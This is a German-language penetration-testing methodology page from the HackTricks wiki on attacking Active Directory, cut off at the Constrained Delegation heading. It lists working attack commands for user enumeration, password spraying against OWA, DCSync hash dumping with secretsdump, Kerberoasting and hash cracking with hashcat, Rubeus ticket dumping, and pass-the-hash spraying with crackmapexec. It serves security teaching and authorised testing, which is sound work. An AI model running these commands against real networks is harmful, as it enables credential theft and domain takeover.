# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Übersicht

**Active Directory** dient als grundlegende Technologie, die es **Netzwerkadministratoren** ermöglicht, **Domains**, **Benutzer** und **Objekte** innerhalb eines Netzwerks effizient zu erstellen und zu verwalten. Es ist so konzipiert, dass es skaliert und eine große Anzahl von Benutzern in handhabbare **Gruppen** und **Untergruppen** organisiert, während **Zugriffsrechte** auf verschiedenen Ebenen gesteuert werden.

Die Struktur von **Active Directory** besteht aus drei Hauptebenen: **domains**, **trees** und **forests**. Eine **domain** umfasst eine Sammlung von Objekten, wie **Benutzer** oder **Geräte**, die eine gemeinsame Datenbank teilen. **Trees** sind Gruppen dieser domains, die durch eine gemeinsame Struktur verbunden sind, und ein **forest** stellt die Sammlung mehrerer trees dar, die durch **trust relationships** miteinander verknüpft sind und die oberste Ebene der Organisationsstruktur bilden. Spezifische **Zugriffs-** und **Kommunikationsrechte** können auf jeder dieser Ebenen festgelegt werden.

Wichtige Konzepte innerhalb von **Active Directory** umfassen:

1. **Directory** – Beinhaltet alle Informationen zu Active Directory-Objekten.
2. **Object** – Bezeichnet Entitäten im Verzeichnis, einschließlich **Benutzer**, **Gruppen** oder **freigegebener Ordner**.
3. **Domain** – Dient als Container für Directory-Objekte; mehrere domains können innerhalb eines **forest** existieren, wobei jede ihre eigene Objektsammlung besitzt.
4. **Tree** – Eine Gruppierung von domains, die eine gemeinsame Root-domain teilen.
5. **Forest** – Die höchste organisatorische Struktur in Active Directory, bestehend aus mehreren trees mit **trust relationships** untereinander.

**Active Directory Domain Services (AD DS)** umfasst eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks wichtig sind. Diese Dienste umfassen:

1. **Domain Services** – Zentralisiert die Datenspeicherung und verwaltet die Interaktionen zwischen **Benutzern** und **domains**, einschließlich **Authentifizierung** und **Suchfunktionen**.
2. **Certificate Services** – Überwacht die Erstellung, Verteilung und Verwaltung sicherer **digitaler Zertifikate**.
3. **Lightweight Directory Services** – Unterstützt directory-fähige Anwendungen über das **LDAP protocol**.
4. **Directory Federation Services** – Bietet **single-sign-on**-Funktionen, um Benutzer über mehrere Webanwendungen in einer einzigen Sitzung zu authentifizieren.
5. **Rights Management** – Hilft beim Schutz urheberrechtlich geschützter Materialien, indem die unbefugte Verbreitung und Nutzung reguliert wird.
6. **DNS Service** – Entscheidend für die Auflösung von **domain names**.

Für eine ausführlichere Erklärung siehe: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Um zu lernen, wie man ein **AD angreift**, muss man den **Kerberos-Authentifizierungsprozess** wirklich gut **verstehen**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Du kannst viel auf [https://wadcoms.github.io/](https://wadcoms.github.io) finden, um schnell einen Überblick darüber zu bekommen, welche Befehle du ausführen kannst, um ein AD zu enumerieren/exploiten.

> [!WARNING]
> Kerberos-Kommunikation **erfordert einen vollständig qualifizierten Namen (FQDN)**, um Aktionen durchzuführen. Wenn du versuchst, auf eine Maschine über die IP-Adresse zuzugreifen, **wird NTLM und nicht Kerberos verwendet**.

## Recon Active Directory (No creds/sessions)

Wenn du nur Zugriff auf eine AD-Umgebung hast, aber keine credentials/sessions, könntest du:

- **Pentest the network:**
- Scanne das Netzwerk, finde Maschinen und offene Ports und versuche, **Vulnerabilities zu exploit-en** oder **Credentials** daraus zu extrahieren (zum Beispiel können [Printers sehr interessante Ziele sein](ad-information-in-printers.md)).
- Die Enumeration von DNS kann Informationen über wichtige Server in der domain liefern wie Web, Drucker, Shares, VPN, Media usw.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Schau dir die allgemeine [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) an, um mehr Informationen darüber zu erhalten, wie man das macht.
- **Checke null- und Guest-Zugriff auf smb-Services** (dies funktioniert nicht auf modernen Windows-Versionen):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Ein detaillierterer Guide, wie man einen SMB-Server enumeriert, ist hier zu finden:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Ein detaillierterer Guide, wie man LDAP enumeriert, ist hier zu finden (achte besonders auf den anonymen Zugriff):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Sammle Credentials, indem du [**Dienste mit Responder impersonierst**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Greife Hosts an, indem du [**den relay attack missbrauchst**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Sammle Credentials, indem du **gefälschte UPnP-Services mit evil-S** exponierst ([**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856))
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrahiere Benutzer-/Namen aus internen Dokumenten, Social Media, Services (hauptsächlich Web) innerhalb der domain-Umgebungen und auch aus öffentlich Verfügbaren Quellen.
- Wenn du die vollständigen Namen von Firmenmitarbeitern findest, könntest du verschiedene AD **username conventions** ausprobieren ([**lies das**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Die gebräuchlichsten Konventionen sind: _NameSurname_, _Name.Surname_, _NamSur_ (3 Buchstaben von jedem), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _zufällige Buchstaben und 3 zufällige Zahlen_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Siehe die Seiten [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) und [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wenn ein **ungültiger Benutzername angefragt** wird, antwortet der Server mit dem **Kerberos-Fehlercode** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, was es uns ermöglicht festzustellen, dass der Benutzername ungültig war. **Gültige Benutzernamen** führen entweder zu einem **TGT in einer AS-REP**-Antwort oder dem Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_, was anzeigt, dass der Benutzer zur Pre-Authentifizierung verpflichtet ist.
- **No Authentication against MS-NRPC**: Verwendung von auth-level = 1 (No authentication) gegen die MS-NRPC (Netlogon) Schnittstelle auf Domain Controllern. Die Methode ruft nach dem Binden der MS-NRPC-Schnittstelle die Funktion `DsrGetDcNameEx2` auf, um zu prüfen, ob der Benutzer oder Computer ohne jegliche Credentials existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art der Enumeration. Die Forschung dazu ist [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf) zu finden.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Wenn Sie einen dieser Server im Netzwerk gefunden haben, können Sie auch eine **Benutzer-Enumerierung gegen diesen Server** durchführen. Zum Beispiel können Sie das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Du kannst Listen von usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  und diesem ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) finden.
>
> Du solltest jedoch die **Namen der Personen, die im Unternehmen arbeiten** aus dem Recon‑Schritt haben, den du zuvor hättest durchführen sollen. Mit Vor‑ und Nachname kannst du das Script [**namemash.py**](https://gist.github.com/superkojiman/11076951) verwenden, um mögliche gültige usernames zu generieren.

### Knowing one or several usernames

Ok, du weißt also bereits, dass du einen gültigen username hast, aber keine Passwörter... Dann versuche:

- [**ASREPRoast**](asreproast.md): Wenn ein Benutzer das Attribut _DONT_REQ_PREAUTH_ **nicht hat**, kannst du eine **AS_REP message** für diesen Benutzer anfordern, die Daten enthält, die mit einer Ableitung des Benutzerpassworts verschlüsselt sind.
- [**Password Spraying**](password-spraying.md): Versuche die häufigsten **common passwords** bei jedem der entdeckten Benutzer, vielleicht verwendet ein Benutzer ein schlechtes Passwort (beachte die Passwortrichtlinie!).
- Beachte, dass du auch **spray OWA servers** kannst, um zu versuchen, Zugriff auf die Mailserver der Benutzer zu erhalten.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Möglicherweise kannst du einige Challenge‑**hashes** erhalten, die du cracken kannst, indem du bestimmte Protokolle im **network** poisonst:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Wenn du es geschafft hast, das Active Directory zu enumerieren, wirst du **mehr emails und ein besseres Verständnis des networks** haben. Du könntest in der Lage sein, NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) zu erzwingen, um Zugriff auf die AD env zu erhalten.

### NetExec workspace-driven recon & relay posture checks

- Nutze **`nxcdb` workspaces** um den AD Recon‑Zustand pro Engagement zu speichern: `workspace create <name>` erzeugt pro‑Protokoll SQLite DBs unter `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Wechsel die Ansicht mit `proto smb|mssql|winrm` und liste gesammelte secrets mit `creds`. Sensible Daten manuell löschen, wenn fertig: `rm -rf ~/.nxc/workspaces/<name>`.
- Schnelle Subnetz-Erkennung mit **`netexec smb <cidr>`** liefert **domain**, **OS build**, **SMB signing requirements** und **Null Auth**. Mitglieder, die `(signing:False)` anzeigen, sind **relay-prone**, während DCs häufig Signing verlangen.
- Generiere **hostnames in /etc/hosts** direkt aus der NetExec-Ausgabe, um das Targeting zu erleichtern:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wenn **SMB relay to the DC is blocked** by signing, prüfe trotzdem die **LDAP**-Postur: `netexec ldap <dc>` hebt `(signing:None)` / weak channel binding hervor. Ein DC mit erforderlichem SMB signing, aber deaktiviertem LDAP signing bleibt ein verwertbares **relay-to-LDAP**-Ziel für Missbrauch wie **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs sometimes **embed masked admin passwords in HTML**. Die Anzeige des Source/Devtools kann Klartext offenbaren (z. B. `<input value="<password>">`), was Basic-auth-Zugriff auf scan/print repositories ermöglicht.
- Abgerufene Print-Jobs können **plaintext onboarding docs** mit pro‑Benutzer Passwörtern enthalten. Halte Zuordnungen beim Testen konsistent:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM-Creds stehlen

Wenn du mit dem **null- oder guest-Benutzer** **auf andere PCs oder Shares zugreifen** kannst, könntest du **Dateien ablegen** (z. B. eine SCF-Datei), die beim Zugriff **eine NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM-Challenge stehlen** kannst, um sie zu cracken:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandelt jeden NT-Hash, den du bereits besitzt, als Kandidatenpasswort für andere, langsamere Formate, deren Schlüsselmaterial direkt aus dem NT-Hash abgeleitet wird. Anstatt lange Passphrasen in Kerberos RC4 Tickets, NetNTLM-Challenges oder gecachte Credentials zu brute-forcen, fütterst du die NT-Hashes in Hashcat’s NT-candidate-Modi und lässt prüfen, ob Passwörter wiederverwendet werden, ohne jemals den Klartext zu erfahren. Das ist besonders effektiv nach einer Domain-Kompromittierung, wenn du tausende aktuelle und historische NT-Hashes sammeln kannst.

Nutze shucking wenn:

- Du ein NT-Korpus aus DCSync, SAM/SECURITY Dumps oder Credential Vaults hast und testen musst, ob Wiederverwendung in anderen Domains/Forests stattfindet.
- Du RC4-basierte Kerberos-Materialien (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-Responses oder DCC/DCC2-Blobs erfasst hast.
- Du schnell Wiederverwendung für lange, unknackbare Passphrasen beweisen und sofort via Pass-the-Hash pivotieren willst.

Die Technik **funktioniert nicht** gegen Encryption-Typen, deren Keys nicht der NT-Hash sind (z. B. Kerberos etype 17/18 AES). Wenn eine Domain nur AES erzwingt, musst du auf die regulären Passwort-Modi zurückgreifen.

#### Aufbau eines NT-Hash-Korpus

- **DCSync/NTDS** – Nutze `secretsdump.py` mit History, um die größtmögliche Menge an NT-Hashes (und deren vorherige Werte) zu holen:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History-Einträge erweitern den Kandidatenpool dramatisch, weil Microsoft bis zu 24 vorherige Hashes pro Account speichern kann. Für weitere Wege, NTDS-Secrets zu sammeln, siehe:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint-Cache-Dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oder Mimikatz `lsadump::sam /patch`) extrahiert lokale SAM/SECURITY-Daten und gecachte Domain-Logons (DCC/DCC2). Dedupliziere und füge diese Hashes zur selben `nt_candidates.txt` Liste hinzu.
- **Metadaten verfolgen** – Behalte den Username/Domain, der jeden Hash produziert hat (auch wenn die Wortliste nur Hex enthält). Sobald Hashcat den Gewinner-Kandidaten ausgibt, zeigt ein übereinstimmender Hash sofort, welcher Principal ein Passwort wiederverwendet.
- Bevorzuge Kandidaten aus derselben Forest oder einem trusted Forest; das maximiert die Chance auf Überschneidungen beim shucken.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Anmerkungen:

- NT-candidate-Eingaben **müssen rohe 32-hex NT-Hashes** bleiben. Deaktiviere Rule-Engines (kein `-r`, keine Hybrid-Modi), weil Mangling das Kandidaten-Schlüsselmaterial zerstört.
- Diese Modi sind nicht per se schneller, aber der NTLM-Keyspace (~30,000 MH/s auf einem M3 Max) ist ~100× schneller als Kerberos RC4 (~300 MH/s). Das Testen einer kuratierten NT-Liste ist weitaus günstiger, als den gesamten Passwortraum im langsamen Format zu durchsuchen.
- Führe immer den **aktuellsten Hashcat-Build** aus (`git clone https://github.com/hashcat/hashcat && make install`), weil die Modi 31500/31600/35300/35400 erst kürzlich hinzugefügt wurden.
- Es gibt derzeit keinen NT-Modus für AS-REQ Pre-Auth, und AES-etypes (19600/19700) benötigen das Klartext-Passwort, weil ihre Keys via PBKDF2 aus UTF-16LE-Passwörtern abgeleitet werden, nicht aus rohen NT-Hashes.

#### Beispiel – Kerberoast RC4 (mode 35300)

1. Capture ein RC4 TGS für ein Ziel-SPN mit einem low-privileged User (siehe die Kerberoast-Seite für Details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck das Ticket mit deiner NT-Liste:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat leitet den RC4-Schlüssel aus jedem NT-Kandidaten ab und validiert den `$krb5tgs$23$...` Blob. Ein Treffer bestätigt, dass das Service-Account eines deiner vorhandenen NT-Hashes verwendet.

3. Sofort via PtH pivotieren:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Optional kannst du später den Klartext mit `hashcat -m 1000 <matched_hash> wordlists/` wiederherstellen, falls nötig.

#### Beispiel – Cached credentials (mode 31600)

1. Dump cached logons von einer kompromittierten Workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopiere die DCC2-Zeile für den interessanten Domain-User in `dcc2_highpriv.txt` und shucke sie:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Ein erfolgreicher Treffer liefert dir den NT-Hash, der bereits in deiner Liste bekannt ist, und beweist, dass der gecachte User ein Passwort wiederverwendet. Verwende ihn direkt für PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oder brute-force ihn im schnellen NTLM-Modus, um den String zu recovern.

Der exakt gleiche Workflow gilt für NetNTLM Challenge-Responses (`-m 27000/27100`) und DCC (`-m 31500`). Sobald ein Match identifiziert ist, kannst du Relay, SMB/WMI/WinRM PtH starten oder den NT-Hash offline mit Masks/Rules erneut cracken.

## Active Directory mit Anmeldeinformationen/Sitzung aufzählen

Für diese Phase musst du **die Credentials oder eine Session eines gültigen Domain-Accounts kompromittiert** haben. Wenn du gültige Credentials oder eine Shell als Domain-User hast, **solltest du bedenken, dass die zuvor genannten Optionen weiterhin Möglichkeiten sind, andere User zu kompromittieren**.

Bevor du mit der authentifizierten Enumeration beginnst, solltest du wissen, was das **Kerberos double hop problem** ist.

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Einen Account kompromittiert zu haben ist ein **großer Schritt, um die gesamte Domain zu kompromittieren**, weil du nun mit der **Active Directory Enumeration** anfangen kannst:

Bezüglich [**ASREPRoast**](asreproast.md) kannst du jetzt jeden möglichen verwundbaren User finden, und bezüglich [**Password Spraying**](password-spraying.md) kannst du eine **Liste aller Usernamen** erstellen und das Passwort des kompromittierten Accounts, leere Passwörter oder andere vielversprechende Passwörter ausprobieren.

- Du könntest die [**CMD verwenden, um ein basic recon durchzuführen**](../basic-cmd-for-pentesters.md#domain-info)
- Du kannst auch [**powershell für recon**](../basic-powershell-for-pentesters/index.html) verwenden, was stealthier ist
- Du kannst auch [**powerview verwenden**](../basic-powershell-for-pentesters/powerview.md), um detailliertere Informationen zu extrahieren
- Ein weiteres großartiges Tool für Recon in Active Directory ist [**BloodHound**](bloodhound.md). Es ist **nicht sehr stealthy** (je nach Collection-Methoden), aber **wenn dir das egal ist**, solltest du es unbedingt ausprobieren. Finde, wo Benutzer RDP ausführen können, finde Pfade zu anderen Gruppen, etc.
- **Weitere automatisierte AD-Enumeration-Tools sind:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md), da sie interessante Informationen enthalten können.
- Ein **GUI-Tool**, das du zur Enumeration des Directory nutzen kannst, ist **AdExplorer.exe** aus der **SysInternal** Suite.
- Du kannst auch die LDAP-Datenbank mit **ldapsearch** durchsuchen, um nach Credentials in den Feldern _userPassword_ & _unixUserPassword_ oder sogar nach _Description_ zu suchen. Vgl. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) für weitere Methoden.
- Wenn du **Linux** nutzt, kannst du die Domain auch mit [**pywerview**](https://github.com/the-useless-one/pywerview) enumerieren.
- Du könntest auch automatisierte Tools ausprobieren wie:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Alle Domain-User extrahieren**

Es ist sehr einfach, alle Domain-Usernames unter Windows zu erhalten (`net user /domain`, `Get-DomainUser` oder `wmic useraccount get name,sid`). Unter Linux kannst du verwenden: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oder `enum4linux -a -u "user" -p "password" <DC IP>`

> Selbst wenn dieser Enumeration-Abschnitt klein wirkt, ist er der wichtigste Teil überhaupt. Greife die Links (vor allem die zu cmd, powershell, powerview und BloodHound) auf, lerne, wie man eine Domain enumeriert, und übe, bis du dich sicher fühlst. Während eines Assessments wird dies der Schlüssel sein, um deinen Weg zu DA zu finden oder zu entscheiden, dass nichts zu machen ist.

### Kerberoast

Kerberoasting beinhaltet das Erlangen von **TGS-Tickets**, die von Services verwendet werden, die an User-Accounts gebunden sind, und das Offline-Cracken ihrer Verschlüsselung — welche auf User-Passwörtern basiert.

Mehr dazu in:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote-Verbindungen (RDP, SSH, FTP, Win-RM, etc)

Sobald du einige Credentials hast, könntest du prüfen, ob du Zugang zu irgendeiner **Maschine** hast. Dazu kannst du **CrackMapExec** verwenden, um Verbindungen zu mehreren Servern mit verschiedenen Protokollen entsprechend deinen Port-Scans zu versuchen.

### Lokale Privilegieneskalation

Wenn du Credentials oder eine Session als regulärer Domain-User kompromittiert hast und mit diesem User **Zugriff** auf **irgendeine Maschine in der Domain** hast, solltest du versuchen, lokal Privilegien zu eskalieren und nach Credentials zu suchen. Nur mit lokalen Administrator-Rechten kannst du **Hashes anderer Benutzer** im Speicher (LSASS) und lokal (SAM) dumpen.

Es gibt eine komplette Seite in diesem Buch über [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) und eine [**Checklist**](../checklist-windows-privilege-escalation.md). Vergiss auch nicht, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) zu nutzen.

### Aktuelle Sitzungstickets

Es ist sehr **unwahrscheinlich**, dass du in der aktuellen User-Session **Tickets** findest, die dir Berechtigungen für unerwartete Ressourcen geben, aber du könntest prüfen:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Wenn es Ihnen gelungen ist, das Active Directory zu enumerieren, werden Sie **mehr E‑Mails und ein besseres Verständnis des Netzwerks** haben. Möglicherweise können Sie NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Jetzt, wo Sie einige grundlegende credentials haben, sollten Sie prüfen, ob Sie **interessante Dateien finden können, die im AD freigegeben sind**. Das könnten Sie manuell tun, aber es ist eine sehr langweilige, sich wiederholende Aufgabe (und noch mehr, wenn Sie Hunderte von Dokumenten finden, die Sie prüfen müssen).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Wenn Sie **auf andere PCs oder Shares zugreifen** können, könnten Sie **Dateien platzieren** (wie eine SCF-Datei), die, wenn sie irgendwie geöffnet werden, eine **NTLM authentication against you** auslösen, sodass Sie die **NTLM challenge** stehlen können, um sie zu cracken:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle erlaubte es jedem authentifizierten Benutzer, den **Domain Controller zu kompromittieren**.

{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Für die folgenden Techniken reicht ein normaler Domain-User nicht aus; Sie benötigen spezielle Privilegien/Credentials, um diese Angriffe durchzuführen.**

### Hash extraction

Hoffentlich ist es Ihnen gelungen, ein **lokales admin**-Konto zu kompromittieren, z. B. mit [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) inklusive Relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) oder durch lokale Privilege Escalation ([escalating privileges locally](../windows-local-privilege-escalation/index.html)).  
Dann ist es Zeit, alle Hashes im Speicher und lokal zu dumpen.  
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald Sie den Hash eines Benutzers haben**, können Sie ihn verwenden, um sich als dieser Benutzer **auszugeben**.  
Sie müssen ein **Tool** verwenden, das die **NTLM authentication using** diesen **Hash** durchführt, **oder** Sie könnten einen neuen **sessionlogon** erstellen und diesen **Hash** in **LSASS** injizieren, sodass bei jeder **NTLM authentication** dieser **Hash verwendet wird.** Die letzte Option ist das, was mimikatz macht.  
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, den NTLM-Hash eines Benutzers zu verwenden, um Kerberos-Tickets anzufordern, als Alternative zum üblichen Pass The Hash über das NTLM-Protokoll. Daher kann dies besonders in Netzwerken nützlich sein, in denen das NTLM-Protokoll deaktiviert ist und nur **Kerberos** als Authentifizierungsprotokoll zugelassen ist.

{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der **Pass The Ticket (PTT)**-Attacke stehlen Angreifer das Authentifizierungsticket eines Benutzers anstelle seines Passworts oder seiner Hash-Werte. Dieses gestohlene Ticket wird dann verwendet, um sich als der Benutzer **auszugeben**, wodurch unautorisierter Zugriff auf Ressourcen und Dienste im Netzwerk erlangt wird.

{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Wenn Sie den **Hash** oder das **Passwort** eines **lokalen Administrators** haben, sollten Sie versuchen, sich lokal auf anderen **PCs** damit anzumelden.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Beachte, dass dies ziemlich **auffällig** ist und **LAPS** dies **mildern** würde.

### MSSQL-Missbrauch & vertrauenswürdige Links

Wenn ein Benutzer die Berechtigung hat, auf **MSSQL-Instanzen** zuzugreifen, könnte er diese nutzen, um auf dem MSSQL-Host **Befehle auszuführen** (falls dieser als SA läuft), den NetNTLM-**Hash** zu **stehlen** oder sogar einen **relay attack** durchzuführen.\
Wenn eine MSSQL-Instanz von einer anderen MSSQL-Instanz vertraut wird (database link) und der Benutzer Berechtigungen für die vertraute Datenbank hat, kann er die Vertrauensbeziehung nutzen, um **auch in der anderen Instanz Abfragen auszuführen**. Diese Vertrauensstellungen können verkettet werden und irgendwann könnte der Benutzer eine fehlkonfigurierte Datenbank finden, in der er Befehle ausführen kann.\
**Die Links zwischen Datenbanken funktionieren sogar über Forest-Trusts hinweg.**

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Missbrauch von IT-Asset-/Deployment-Plattformen

Drittanbieter-Inventar- und Deployment-Suiten bieten oft mächtige Wege zu credentials und zur Code-Ausführung. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn du ein Computerobjekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und du Domänenrechte auf dem Computer hast, kannst du TGTs aus dem Speicher aller Benutzer auslesen, die sich an dem Computer anmelden.\
Wenn also ein **Domain Admin sich auf dem Computer anmeldet**, kannst du seinen TGT dumpen und dich mit [Pass the Ticket](pass-the-ticket.md) als ihn ausgeben.\
Dank constrained delegation könntest du sogar **automatisch einen Print Server kompromittieren** (hoffentlich ist es ein DC).

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

